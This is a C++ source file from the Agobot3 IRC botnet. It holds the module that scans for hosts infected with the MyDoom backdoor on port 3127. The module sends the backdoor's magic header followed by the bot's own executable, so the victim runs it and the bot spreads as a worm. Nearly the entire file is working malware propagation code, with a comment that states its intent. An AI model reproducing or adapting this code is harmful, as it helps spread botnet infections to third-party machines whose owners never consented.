/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (c) 2004 Ago and the Agobot team
	All rights reserved.

	This is private software, you may redistribute it under the terms of
	the APL(Ago's Private License) which follows:
  
	Redistribution and use in binary forms, with or without modification,
	are permitted provided that the following conditions are met:
	1. The name of the author may not be used to endorse or promote products
	   derived from this software without specific prior written permission.
	2. The binary and source may not be sold and/or given away for free.
	3. The licensee may only create binaries for his own usage, not for any
	   third parties.
	4. The person using this sourcecode is a developer of said sourcecode.

	Redistribution and use in source forms, with or without modification,
	are not permitted.

	This license may be changed without prior notice.

	THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
	IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
	OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
	IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
	INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
	NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
	DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
	THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
	(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
	THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. */

#include "main.h"
#include "mainctrl.h"
#include "scanner.h"
#ifdef __COMPILE_SCANNER_DOOM__
#include "utility.h"

class CScannerDoom : public CScannerBase
{
public:
	CScannerDoom();
	virtual ~CScannerDoom() throw() { }
	bool Exploit();
};

/*
		Doom Scanner starts here
		scans for backdoor left behind by MyDoom and tries to exploit it by sending
		\x85\x13\x3C\x9E\xA2+EXE File Contents to the remote host and hoping it
		happily executes it.
*/

#define DOOM_DEFAULT_PORT 3127

char doom_header[]=
	"\x85\x13\x3C\x9E\xA2";

int MapFile(const char *szFile, char **szBuffer) {
	// Try to open the file
	FILE *fp=fopen(szFile, "rb"); if(!fp) return 0;
	// Get the file size
	fseek(fp, 0, SEEK_END); unsigned int iFileSize=(int)ftell(fp); fseek(fp, 0, SEEK_SET);
	// Allocate the memory for the mapping
	*szBuffer=(char*)malloc(iFileSize); if(!*szBuffer) { fclose(fp); return 0; }
	// Read the file into memory
	if(fread(*szBuffer, sizeof(char), iFileSize, fp)<iFileSize) { fclose(fp); return 0; }
	// Close the file and return
	fclose(fp); return iFileSize; }

void UnmapFile(char *szBuffer) {
	// Free the memory for the file
	free(szBuffer); }

CScannerDoom::CScannerDoom() { m_szType="CScannerDoom"; m_sScannerName.Assign("Doom"); }

bool CScannerDoom::Exploit()
{
	char szReqBuf[4096];

	if(!IsPrivate(g_pMainCtrl->m_pIRC->m_sLocalIp.CStr()) && IsPrivate(m_sSocket.m_szHost)) return false;

	char szBuffer[MAX_PATH]; GetFilename(szBuffer, sizeof(szBuffer));
	char *szFileContents=NULL;
	int iFileContentsSize=MapFile(szBuffer, &szFileContents);

	if(iFileContentsSize) {
		// Connect to the server
		if(!m_sSocket.Connect(m_sSocket.m_szHost, DOOM_DEFAULT_PORT)) // Connect failed, exit
		{	UnmapFile(szFileContents); return false; }

		// Send the doom header
		if(!m_sSocket.Write(doom_header, sizeof(doom_header)-1))
		{	m_sSocket.Disconnect(); UnmapFile(szFileContents); return false; }

		// Send the file
		int iSendPos=0, iFileSize=iFileContentsSize;
		while(iFileContentsSize>1024)
		{	if(!m_sSocket.Write(szFileContents+iSendPos, 1024))
			{	m_sSocket.Disconnect(); UnmapFile(szFileContents); return false; }
			iSendPos+=1024; iFileContentsSize-=1024; }

		if(!m_sSocket.Write(szFileContents+iSendPos, iFileSize-iSendPos))
		{	m_sSocket.Disconnect(); UnmapFile(szFileContents); return false; }

		if (g_pMainCtrl->m_pBot->scaninfo_level.iValue >= 2)
		{
			SendLocal("%s: exploited %s", m_sScannerName.CStr(), m_sSocket.m_szHost);
		}
		m_sSocket.Disconnect();
	}

	UnmapFile(szFileContents); return false;
}

REGSCANNER(Doom_3127, Doom, 3127, true, true, false)

#endif // __COMPILE_SCANNER_DOOM__
